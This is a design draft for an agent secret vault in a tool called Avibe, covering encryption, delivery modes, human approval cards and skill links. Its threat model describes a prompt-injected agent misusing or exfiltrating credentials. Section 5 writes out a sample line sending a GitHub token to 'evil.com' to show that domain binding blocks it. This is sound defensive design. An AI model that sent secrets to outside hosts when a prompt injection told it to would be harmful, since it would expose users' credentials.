# Vaults — secret management for agents

Status: **draft for discussion** (no implementation yet)
Owner: Alex + agent session `sestvmy6e5c8e`
Date: 2026-06-12

## 1. Background

Agents constantly need third-party credentials (API keys, tokens, signing keys).
Today in Avibe every credential is plaintext: platform tokens and provider API
keys live in `~/.avibe/config/config.json` / `~/.avibe/state/settings.json`, and
anything an agent needs at runtime ends up pasted into chat, written into
`.env` files by hand, or exported in the shell. Whatever enters the
conversation enters the LLM context — transcripts, IM history, provider logs.

PR #555 ("redact config secrets") added response-side masking and a frontend
`secretFields.ts` registry — the first step of the same arc. The Web UI shell
already reserves the surface: a `/vaults` route and `VaultsPage.tsx`
placeholder exist alongside Agents / Skills / Harness.

The industry hit the same wall in 2025–2026: GitGuardian found 24k+ secrets
exposed in MCP config files; OWASP lists credential leakage via prompt context
as a top LLM risk; a wave of "vault for agents" products appeared
(Infisical agent-vault, Agentic Vault, Axis, Arcade, Composio — see §11).
The shared insight, which is also the core principle of this design:

> **Secrets must never enter the model's context. The model handles secret
> *names*; the platform handles secret *values*.**

## 2. Goals and non-goals

Goals:

1. **Store** — a Vaults page where the user manages named secrets
   (`NAME` → value, env-var mental model), with two protection tiers.
2. **Deliver** — agents obtain secrets via CLI with values never written to
   stdout; delivery is indirect (child-process env, file render, signing,
   brokered HTTP), so values stay out of context by construction.
3. **Ask** — agents can request a missing secret; the user fills it through a
   trusted UI channel (never through chat text), and the agent is woken up
   with the *name only*.
4. **Approve** — protected secrets require explicit, per-use human approval
   with an auditable record (inbox card: who asks, which key, in what form).
5. **Link** — secrets relate to Skills (skill declares what it needs; vault
   shows per-skill fill-in status).
6. **Sign** — the vault can hold keypairs and act as a signing oracle: the
   private key never leaves the vault; agents submit payloads and receive
   signatures (future: wallet for on-chain transactions).

Non-goals (now):

- Team/multi-user sharing — Avibe is personal; one user per instance.
- Replacing provider OAuth flows (Claude/Codex login stays as is); migrating
  platform/provider config secrets into the vault is a later unification (§13 P3).
- Defending against a fully malicious agent running as the same OS user (§3).

## 3. Threat model

What we defend against, in increasing strength:

| # | Threat | Defense |
| --- | --- | --- |
| T1 | Secret value accidentally enters LLM context / transcripts / IM history | values never on stdout; injection happens below the agent's text channel; dynamic ask goes through UI, not chat |
| T2 | DB/file exfiltration (backups, `vibe data query`, casual `cat`) | everything encrypted at rest (envelope, §8); vault tables denylisted in `data query` |
| T3 | Agent (possibly prompt-injected) uses a high-value secret without the user knowing | `protected` tier: per-use approval enforced **cryptographically** — the key material to decrypt simply is not on the machine until the user supplies it |
| T4 | Agent exfiltrates the value after legitimate delivery | sign/proxy modes: value never materializes in agent-accessible space at all; plus outbound redaction filter (§10) as a tripwire |

Explicitly out of scope, stated honestly:

- A malicious process running as the same OS user can read injected files,
  inspect child-process environments, or call the same decryption code path
  the CLI uses for the `standard` tier. The `standard` tier prevents
  *accidents and remote exfiltration*, not a determined local attacker.
  The `protected` tier and the sign/proxy modes are the answer when that
  matters — that's why the design is a ladder, not a single mechanism.
- Approval fatigue is a real failure mode; approval cards must show enough
  context (requester, delivery form, payload preview) to make rubber-stamping
  visibly risky, and per-secret policies (§9) reduce prompt frequency.

## 4. Concepts and data model

One new domain, four tables (SQLAlchemy `Table` in `storage/models.py` +
Alembic migration, per existing pattern):

### `vault_secrets`

| column | notes |
| --- | --- |
| `id`, `created_at`, `updated_at` | usual |
| `name` | unique, ENV-style (`^[A-Z][A-Z0-9_]*$`), global namespace |
| `kind` | `static` (a value) \| `keypair` (a signing key) |
| `protection` | `standard` \| `protected` (see below) |
| `ciphertext`, `nonce`, `wrap_meta` | envelope-encrypted value / private key (§8); **no plaintext column exists** |
| `public_meta` | JSON: description, for `keypair`: algo, public key, derived address |
| `policy` | JSON: allowed delivery modes, allowed hosts (proxy), always-ask flag |
| `last_used_at`, `use_count` | surfaced in UI |

Protection tiers (refining the original 明文/加密 framing):

- **`standard`** ("plain" in UX terms): no user interaction to use. *Still
  encrypted at rest* under a machine key held in the OS keychain (file
  fallback on headless boxes). Rationale: `vibe data query` has no table
  denylist today, DB files travel in backups, and at-rest encryption is
  nearly free. "Plaintext" describes the *experience* (zero friction), not
  the storage.
- **`protected`** ("encrypted" in UX terms): wrapped under a key derived from
  a user secret (vault password, later passkey PRF). Every use requires the
  user to approve and supply the unlock factor. The daemon *cannot* decrypt
  these alone — approval is enforced by cryptography, not by an `if`.
- `keypair` secrets are always `protected` (hard rule, per requirement).

### `vault_requests` — one queue for everything that needs a human

Unifies the two interactive flows (and the future sign/proxy approvals) into
a single object so there is one inbox surface, one card component, one audit
trail:

| column | notes |
| --- | --- |
| `id`, `created_at`, `decided_at`, `expires_at` | |
| `request_type` | `provision` (fill a missing secret) \| `access` (use a protected secret) \| `sign` \| `proxy` |
| `secret_name` | target |
| `requester` | JSON: session_id, agent name/backend, run id — rendered on the card |
| `delivery` | JSON: mode (`env`/`file`/`sign`/`proxy`) + details (env var name, file path, payload digest/preview, target host) |
| `status` | `pending` → `fulfilled`/`approved`/`denied`/`expired`/`canceled` |
| `message_id` | the chat message that carried the ask card, if any |

### `vault_links`

`secret_name` ↔ `skill_name`, plus `source` (`skill_meta` \| `agent` \| `user`)
and `required` flag. Skill-meta links are derived (re-synced from SKILL.md
frontmatter); agent/user links are explicit rows.

### `vault_audit`

Append-only: `ts`, `event` (`created/updated/deleted/delivered/denied/signed/
proxied/redacted/...`), `secret_name`, `requester`, `delivery` summary,
`request_id`. Values never appear in audit rows. Surfaced as a log tab on the
Vaults page.

`vibe data query` gains a denylist for `vault_secrets` (ciphertext anyway,
but no reason to expose it); `vault_requests`/`vault_links`/`vault_audit`
remain queryable.

## 5. Delivery modes — the security ladder

Four ways a secret leaves the vault, ordered by exposure. Per-secret `policy`
can restrict which modes are allowed (e.g. a GitHub PAT: proxy-only).

### M1 `run` — child-process env (default, the `op run` pattern)

```bash
vibe vault run --env OPENAI_API_KEY --env DB_URL=PROD_DB_URL -- python sync.py
```

CLI resolves values (through the daemon, §7), injects them into the **child
process env only**, and execs. Nothing on stdout; nothing persists after the
child exits. This is the right default because harness Bash calls don't share
shell state anyway — a child wrapper is strictly better than `export`.

### M2 `inject` — file render (the `op inject` pattern)

```bash
vibe vault inject --out .env --keys OPENAI_API_KEY,SENTRY_DSN   # dotenv format
vibe vault inject --template deploy.yaml.tpl --out deploy.yaml  # {{ vault.NAME }} placeholders
```

For tools that can't take env. Written `0600`; recorded in audit with path;
optional `--ttl 10m` registers a daemon-side cleanup. The agent is told the
file path, never the content.

### M3 `sign` — signing oracle (keypairs; key never leaves)

```bash
vibe vault keygen GH_RELEASE_KEY --algo ed25519
vibe vault sign --key GH_RELEASE_KEY --in artifact.tar.gz --out artifact.sig
vibe vault sign --key ETH_MAIN --eth-tx tx.json --out signed.hex   # later
```

Signature/pubkey/address are not secrets → stdout is fine. Always `protected`
→ every sign is an approval card showing a payload preview (for eth: decoded
`to`/`value`/calldata summary — the hardware-wallet UX). Future: policy engine
(spend caps, contract allowlists — the Turnkey model) once wallet use matures.

### M4 `proxy` — brokered request (value never in agent space)

```bash
vibe vault fetch --auth GITHUB_PAT -- -X POST https://api.github.com/repos/x/y/issues -d @body.json
```

The daemon attaches the credential per the secret's auth template
(`Authorization: Bearer …` / header / query param) and forwards; the agent
sees only the response. **Domain binding** is the killer property: the secret
carries an allowed-hosts list, deny by default — a prompt-injected
`fetch --auth GITHUB_PAT https://evil.com` fails closed regardless of what
the model was tricked into wanting.

P3 option: a transparent MITM proxy (`HTTPS_PROXY` + local CA) with dummy
placeholder env values that get swapped at egress — the Infisical agent-vault
trick, where even a leaked env var leaks only `__github_pat__`. Powerful but
invasive (CA trust install); evaluate embedding their MIT Go binary as an
optional component (like Show Runtime) vs. building on `mitmproxy`. The
explicit broker ships first: zero setup, same isolation for the common case.

## 6. Dynamic ask — `$<NAME>` and `vibe vault request`

Two entry points, one `vault_requests(provision)` object:

**Conversational markup.** The agent writes `$<OPENAI_API_KEY>` in its reply.
`core/reply_enhancer.py` (the existing chokepoint that already parses silent
blocks / file links / quick replies) extracts it into
`EnhancedReply.secret_requests`, the dispatcher creates the request row, and:

- **Web/workbench**: the message renders a **SecureInputCard** (the
  `lib/mentions.ts` linkify pattern: rewrite to an `avibe-secret:NAME` link,
  custom renderer in `ui/markdown.tsx`). Card = name + requester + protection
  picker + masked input + Save-to-Vault. Submission goes `POST /api/vault/…`
  over TLS — never into the chat transcript.
- **IM platforms** (no secure inputs): the marker is replaced with
  `🔐 Agent requests OPENAI_API_KEY → [Open Vaults](https://<tunnel>/vaults?request=<id>)`
  via the existing per-platform formatter layer.

Parsing rules: `\$<[A-Z][A-Z0-9_]*>` outside code fences only (same fence
guard as mentions); unknown/already-configured names degrade gracefully.

**CLI (works for headless/scripted flows and is the blocking primitive):**

```bash
vibe vault request OPENAI_API_KEY --reason "sync script needs OpenAI" --wait 600
vibe vault request AWS_KEY --skill deploy-aws --no-wait
```

`--wait` long-polls the daemon until fulfilled/denied/timeout, then exits 0/1
with a JSON envelope — so an agent can ask and *keep working when the answer
arrives*, mid-turn. `--no-wait` returns immediately; on fulfillment the daemon
enqueues a `hook_send` back into the originating session (existing
`TaskExecutionStore.enqueue_hook_send` path, like watches).

**Hard rule: the fulfillment/wake-up message carries the secret *name* only,
never the value.** ("`OPENAI_API_KEY` is now available in the vault — use
`vibe vault run …`.") Putting the value into the resume prompt would undo the
entire design.

## 7. Where enforcement lives (CLI ↔ daemon)

Today most CLI commands read SQLite directly. Vault value paths must instead
go **through the daemon** (the existing internal UDS server,
`vibe/internal_client.py` pattern — new `/internal/vault/*` endpoints):

- one process owns decryption, policy checks, audit writes, approval
  orchestration, and TTL cleanups;
- `protected`-tier approvals need the daemon anyway (SSE to browser, IM
  notifications, request lifecycle);
- the CLI receives plaintext only over the local socket, holds it in memory,
  injects (M1/M2), and forgets.

Metadata commands (`list`, `link`, `status`) may keep direct-DB reads like
their siblings. If the daemon is down, value commands fail with a clear
"vault requires the running service" error (standard-tier offline fallback is
a possible later convenience; not in scope).

## 8. Crypto design

Envelope encryption, boring and standard (validated by Bitwarden/1Password
architecture and the PRF guidance in §11):

```
value --AES-256-GCM--> ciphertext            (DEK: random 32B per secret)
DEK   --wrapped by--> KEK(s)
  standard:  KEK_machine  = random 32B in OS keychain (python `keyring`;
             0600 file fallback ~/.avibe/state/vault.key on headless boxes)
  protected: KEK_password = Argon2id(vault password, per-vault salt)
             KEK_passkey  = HKDF(WebAuthn PRF output)        [P2]
```

- A `protected` DEK can be wrapped multiple times (password + N passkeys) —
  losing one factor doesn't lose the secret; password remains the recovery
  factor (PRF support is good in 2026 but not universal — treat as
  enhancement, per Corbado/Bitwarden guidance).
- Primitives from `pyca/cryptography` (already a dependency via web push):
  AESGCM, HKDF, ed25519. Argon2id via `argon2-cffi` (small, standard; the
  zero-new-dep alternative is `cryptography`'s Scrypt — decision point).
  secp256k1 (`coincurve`) only as an optional extra when the wallet ships.
- **Where protected-tier decryption happens** (decision point): recommended
  endgame is client-side — browser derives KEK (argon2 wasm / PRF via
  WebCrypto), unwraps DEK, decrypts, POSTs plaintext once over TLS for
  injection; the daemon never holds long-term key material. Acceptable P1
  simplification: send the password to the daemon, derive+decrypt server-side,
  zeroize best-effort. Same wire exposure (TLS to the user's own machine);
  client-side is cleaner long-term, server-side ships faster.
- Python can't truly zeroize memory; noted, accepted for a local-first tool
  (the alternative is a native helper — not worth it now).
- Web UI never gets values back: reads return masked previews (`sk-…cd34`,
  reusing the #555 `secretFields.ts` pattern). `standard` values may offer
  explicit reveal-on-click (decision point); `protected` values never.

## 9. Approval flow (protected tier, sign, proxy)

1. Agent runs `vibe vault run --env STRIPE_KEY -- …` where `STRIPE_KEY` is
   `protected` → daemon creates `vault_requests(access, pending)`; CLI blocks.
2. Fan-out through existing rails: SSE event → workbench toast + Vaults badge
   + Inbox; IM notification with deep link (web push later). Approval itself
   happens **on the web UI only** (it sits behind avibe.bot OIDC; an IM
   account is a weaker authenticator — decision point if we ever relax this).
3. The card shows: secret name, requester (agent/session/run), delivery form
   ("env `STRIPE_KEY` to command `python billing.py`" / file path / payload
   preview for sign / target URL for proxy), reason if provided.
4. User enters vault password (or passkey) → approve once / deny.
   (Optional later: "allow for this session for 1h" grants to fight fatigue.)
5. Daemon decrypts, hands the value to the blocked CLI over UDS, writes
   audit, fires `vault.request.decided` SSE. Deny/timeout → CLI exits nonzero
   with a clean, relayable error.

`standard`-tier uses skip 1–4 (silent, audited; per-secret `always_ask`
policy flag can opt in to prompts).

## 10. Outbound redaction (tripwire layer)

Because the dispatcher (`core/message_dispatcher.py`) is the single outbound
chokepoint, we can scan every outgoing message for known plaintext values
(standard-tier values; protected-tier values during their active grant
window) and replace with `[REDACTED:NAME]` + audit event + warning toast.
Exact-match (plus base64/url-encoded variants) only — cheap, no heuristics.
This converts "agent accidentally echoed the secret" from a breach into a
logged near-miss. Recommended for P1.

## 11. Prior art and library survey

Patterns we adopt:

- **Injection UX** — 1Password CLI [`op run` / `op inject` / secret
  references](https://developer.1password.com/docs/cli/secret-references/);
  same shape in [Infisical `infisical run`](https://infisical.com/docs/documentation/platform/secrets-mgmt/overview).
  M1/M2 are these patterns, vault-local.
- **Brokered credentials / auth proxy** —
  [Arcade.dev](https://docs.arcade.dev/en/get-started/about-arcade) (tokens
  injected into tool context, "LLM never sees the token", just-in-time user
  authorization) and [Composio](https://docs.composio.dev/docs/authentication)
  (Connect Links ≈ our dynamic ask). Validates M4 and the ask flow.
- **Vault-for-agents OSS** —
  [Infisical agent-vault](https://github.com/Infisical/agent-vault) (MIT, Go;
  MITM proxy + dummy-placeholder substitution at egress; egress allowlists;
  master password unset after read; "Preview" maturity, ~1.7k stars);
  Agentic Vault (MCP server, per-secret host/command/env allowlists, deny by
  default, AGPL); Axis (`agent-secrets-vault`, master key in OS keychain,
  localhost dashboard); Cerberus (Vaultwarden + `{{password}}` substitution
  below the AI layer). None has our IM surface, inbox approvals, or Skills
  linkage — that's the Avibe-native value; their egress-binding and
  placeholder ideas are worth stealing.
- **Signing oracle** — HashiCorp Vault Transit (sign/verify as API, keys
  non-exportable); [Turnkey](https://www.turnkey.com/solutions/ai-agents) /
  Privy / [Coinbase Agentic Wallets](https://github.com/coinbase/agentkit)
  (TEE/MPC + policy engine: auto-sign under $X, human approval above).
  Our M3 is the local, personal-scale version: software keys + approval
  cards + payload preview now; policy engine later; their TEE custody is the
  upgrade path if stakes grow.
- **Passkey-derived encryption** —
  [WebAuthn PRF](https://developers.yubico.com/WebAuthn/Concepts/PRF_Extension/);
  [Bitwarden ships passkey vault unlock](https://bitwarden.com/blog/prf-webauthn-and-its-role-in-passkeys/);
  2026 status per [Corbado](https://www.corbado.com/blog/passkeys-prf-webauthn):
  synced providers (iCloud/Google/Windows Hello) solid, iOS+security-key gap
  remains → PRF as enhancement over password, multi-wrap DEK.
- **Libraries** — [`keyring`](https://pypi.org/project/keyring/) (OS keychain;
  macOS caveat: same-binary access is silent — fine for our machine-key tier),
  `pyca/cryptography` (already in-tree), `argon2-cffi`,
  [PyNaCl](https://pypi.org/project/PyNaCl/) (alternative misuse-resistant
  stack if we'd rather `SecretBox` than AESGCM), `coincurve`/`eth-account`
  (wallet phase), `py_webauthn` (RP-side PRF, P2).

Why not embed an existing vault wholesale: Infisical proper is a
Postgres+Redis+Node service (absurd for a personal local-first tool);
agent-vault is proxy-shaped, "Preview", and has no human-approval loop — and
the product surface we actually need (Vaults page, IM cards, inbox, Skills
linkage, dynamic ask) is Avibe-native regardless. Build the store thin on
standard primitives; consider agent-vault as an optional P3 transparent-proxy
component.

## 12. Skills integration

1. **Meta header** (primary): SKILL.md frontmatter gains a `secrets` field —

   ```yaml
   ---
   name: deploy-aws
   secrets:
     - name: AWS_ACCESS_KEY_ID
       required: true
       description: IAM key with deploy permissions
     - name: SLACK_WEBHOOK_URL
       required: false
   ---
   ```

   Avibe reads skill metadata exclusively through `askill --json`
   (`core/services/skills.py`), so askill (our repo) must parse/pass this
   field through. Vaults page gets a "Skills" view: per-skill required keys
   with ✓ configured / ✗ missing status and one-click fill; `vault_links`
   rows are synced from this with `source=skill_meta`.

2. **Agent CLI**: `vibe vault link --skill deploy-aws AWS_ACCESS_KEY_ID` —
   when an agent discovers an undeclared need mid-run, it links and then
   `vibe vault request`s; the provision card shows the skill context.

3. **Manual UI**: link/unlink from either the secret detail or the skill
   detail side.

Names are the join key (global env-style namespace — same mental model as
env vars; per-skill aliasing is deliberately out of scope until proven needed).

## 13. Phasing

**P0 — store + deliver + ask (the useful core)**
`vault_secrets` (standard tier) + machine-key envelope + Alembic migration;
Vaults page CRUD (masked inputs, reuse `secretFields.ts` patterns); daemon
`/internal/vault/*` + `/api/vault/*`; CLI `vibe vault list / set / rm / run /
inject / request --wait/--no-wait`; `$<NAME>` markup → web SecureInputCard +
IM deep link; `vault_audit` + audit tab; `data query` denylist.

**P1 — protected tier + approvals + tripwire**
Vault password (Argon2id), protected secrets, unified `vault_requests`
approval cards (web-only approve), SSE/IM/inbox notifications, outbound
redaction filter, `vibe vault link` + skills `secrets:` frontmatter
(askill change) + per-skill status view.

**P2 — passkeys + signer + broker**
WebAuthn PRF unlock (multi-wrap, password fallback); `keygen`/`sign`
(ed25519 first; secp256k1 + eth-tx preview behind optional extra);
explicit `vibe vault fetch` broker with per-secret host allowlists.

**P3 — transparent proxy + unification + policy**
Transparent MITM proxy option (embed agent-vault vs mitmproxy build);
migrate platform/provider config secrets into the vault (closing the #555
arc); signer policy engine (caps/allowlists); session-scoped grants.

## 14. Open questions for discussion

1. **"明文" tier at rest**: literal plaintext vs machine-key encryption with
   zero-friction UX (recommended). Any reason to keep literal plaintext?
2. **Protected-tier decryption locus**: browser-side (cleaner endgame) vs
   daemon-side (ships faster) for P1; and Argon2id (`argon2-cffi`) vs Scrypt
   (zero new dep)?
3. **Naming**: `vibe vault …` CLI + "Vaults" page — and is it one vault
   (flat namespace, recommended) or multiple named vaults eventually?
4. **Approve-from-IM**: keep approval web-only (recommended; OIDC-gated) or
   allow IM quick-reply approve for low-stakes secrets?
5. **Reveal-on-click** for standard-tier values in the UI: allow or never?
6. **Blocking defaults**: `request --wait` / protected-access timeout
   (proposal: 10 min) and how a denied/expired wait reads to the agent.
7. **Scope**: secrets are instance-global (env-var model, recommended) — any
   per-project need on the horizon that should shape the schema now?
8. **Signer priority**: is ed25519-generic (artifact signing, SSH-ish) or
   secp256k1/eth (wallet) the first real use case?
9. **askill**: confirm we own the frontmatter extension and the `--json`
   passthrough (filed against askill?).
10. **Endgame for provider/platform secrets**: agree the vault becomes the
    single secret store (P3) so #555-style redaction converges here?
